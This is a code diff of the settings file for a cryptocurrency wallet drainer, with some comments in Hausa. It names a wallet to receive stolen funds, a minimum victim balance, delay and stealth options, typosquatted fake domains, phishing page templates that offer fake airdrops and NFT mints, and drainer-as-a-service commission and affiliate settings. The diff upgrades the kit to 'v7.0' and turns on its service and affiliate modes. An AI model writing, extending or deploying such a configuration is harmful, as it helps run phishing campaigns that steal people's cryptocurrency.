@@ -1,20 +1,20 @@
 // ============================================
-// DRAINER SETTINGS - CIKAKKEN NA GASKE
+// ADVANCED DRAINER SETTINGS v7.0
 // ============================================
 
 // 1. WALLET ADDRESS (Inda za a tura kuɗi)
 const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";
 
-// 2. MINIMUM BALANCE (Akalla nawa kafin a kwashe)
-const minimumBalance = 50;
+// 2. MINIMUM BALANCE (31 - Minimum Balance Check)
+const minimumBalance = 50; // $50 USDT
 
-// 3. DELAY (Jinkiri kafin a kwashe - sa'o'i)
-const delayHours = 2;
+// 3. DELAY (32 - Delay Mechanism - sa'o'i)
+const delayHours = 2; // Sa'o'i 2-48
 
 // 4. NETWORK
 const network = "mainnet";
 
-// 5. TOKEN SETTINGS
+// 5. TOKEN SETTINGS (24 - Multi-Token Support)
 const tokenSymbol = "USDT";
 const decimals = 18;
 
@@ -35,7 +35,7 @@ const TOKEN_ABI = [
     "function balanceOf(address account) public view returns (uint256)"
 ];
 
-// 8. FAKE DOMAINS (Typosquatting)
+// 8. FAKE DOMAINS (23 - Typosquatting)
 const FAKE_DOMAINS = [
     "bybit-airdrop.com",
     "bybit-claim.net",
@@ -49,7 +49,7 @@ const FAKE_DOMAINS = [
     "zksync-rewards.com"
 ];
 
-// 9. PHISHING PAGES
+// 9. PHISHING PAGES (1-20)
 const PHISHING_PAGES = {
     'bnb': { title: 'BNB Airdrop', subtitle: 'Claim 500 BNB + 10,000 USDT', logo: '💰' },
     'opensea': { title: 'OpenSea - Exclusive Mint', subtitle: 'Mint your exclusive NFT collection now', logo: '🎨' },
@@ -73,12 +73,22 @@ const PHISHING_PAGES = {
     'renzo': { title: 'Renzo - REZ Claim', subtitle: 'Claim your REZ tokens', logo: '💫' }
 };
 
-// 10. STEALTH SETTINGS
+// 10. STEALTH SETTINGS (30 - Stealth Mode)
 const stealthMode = true;
+
+// 11. RETRY SETTINGS (29 - Retry Mechanism)
 const retryAttempts = 3;
+
+// 12. GAS SETTINGS (27 - Gas Optimization)
 const gasMultiplier = 1.1;
 
-// 11. DaaS SETTINGS (Drainer-as-a-Service)
+// 13. DaaS SETTINGS (35 - Drainer-as-a-Service)
+const daasEnabled = true;
 const daasCommission = 20; // 20% ga operator
-const affiliateEnabled = false;
+
+// 14. AFFILIATE SETTINGS (36 - Affiliate Program)
+const affiliateEnabled = true;
 const affiliateAddress = "0x0000000000000000000000000000000000000000";
+
+// 15. MULTI-CHAIN SUPPORT (40 - Multi-Chain)
+const chains = ['BSC', 'Ethereum', 'Polygon', 'Arbitrum', 'Optimism'];
